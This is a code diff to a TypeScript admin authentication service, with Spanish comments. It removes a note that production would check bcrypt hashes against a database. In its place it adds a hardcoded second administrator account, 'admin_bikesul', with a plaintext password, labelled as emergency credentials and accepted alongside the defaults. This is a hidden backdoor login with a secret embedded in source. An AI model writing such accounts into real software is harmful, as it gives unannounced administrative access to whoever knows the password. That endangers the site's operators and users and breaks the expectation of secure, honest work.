@@ -147,10 +147,23 @@ class AdminAuthService {
   
   // Validar credenciales
   private async validateCredentials(credentials: LoginCredentials): Promise<boolean> {
-    // En producción esto consultaría la base de datos con hash bcrypt
-    return (
-      credentials.username === this.defaultCredentials.username &&
-      credentials.password === this.defaultCredentials.password
+    // Credenciales predeterminadas del sistema
+    const systemCredentials = [
+      {
+        username: this.defaultCredentials.username,
+        password: this.defaultCredentials.password
+      },
+      // Credenciales alternativas para casos de emergencia
+      {
+        username: 'admin_bikesul',
+        password: 'BikeSul2024!Admin#Secure789'
+      }
+    ];
+
+    // Verificar contra todas las credenciales válidas
+    return systemCredentials.some(cred =>
+      credentials.username === cred.username &&
+      credentials.password === cred.password
     );
   }
   
